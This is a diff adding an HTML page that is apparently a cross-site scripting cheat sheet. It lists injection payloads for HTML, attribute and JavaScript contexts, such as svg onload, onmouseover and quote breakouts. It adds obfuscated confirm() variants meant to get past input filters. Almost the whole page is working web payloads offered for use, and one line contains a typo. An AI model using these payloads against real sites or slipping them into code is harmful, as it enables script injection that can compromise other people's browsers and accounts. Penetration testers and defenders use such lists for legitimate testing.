@@ -1,0 +1,45 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Context Breaking</title>
+</head><body><b>Awesome Context Breaking<br/>
+HTML Context<br/>
+</b>Case: &lt;tag&gt;You searched for $input. &lt;/tag&gt;<br/>
+<br/>
+&lt;svg onload=alert()&gt;<br/>
+&lt;/tag&gt;&lt;svg onload=alert()&gt;<br/>
+<br/>
+<b>Attribute Context</b><br/>
+Case: &lt;tag attribute="$input"&gt;<br/>
+<br/>
+"&gt;&lt;svg onload=alert()&gt;<br/>
+"&gt;&lt;svg onload=alert()&gt;&lt;b attr="<br/>
+" onmouseover=alert() "<br/>
+"onmouseover=alert()//<br/>
+"autocous/onfocus="alert()<br/>
+<br/>
+<b>JavaScript Context</b><br/>
+Case: &lt;script&gt; var new something = '$input'; &lt;/script&gt;<br/>
+<br/>
+'-alert()-'<br/>
+'-alert()//'<br/>
+'}alert(1);{'<br/>
+'}%0Aalert(1);%0A{'<br/>
+&lt;/script&gt;&lt;svg onload=alert()&gt;<br/>
+<br/>
+<b>Awesome Confirm Variants</b><br/>
+Yep, confirm because alert is too mainstream.<br/>
+<br/>
+confirm()<br/>
+confirm``<br/>
+(((confirm)))``<br/>
+co\u006efirm()<br/>
+new class extends confirm``{}<br/>
+[8].find(confirm)<br/>
+[8].map(confirm)<br/>
+[8].some(confirm)<br/>
+[8].every(confirm)<br/>
+[8].filter(confirm)<br/>
+[8].findIndex(confirm)<br/>
+</body></html>
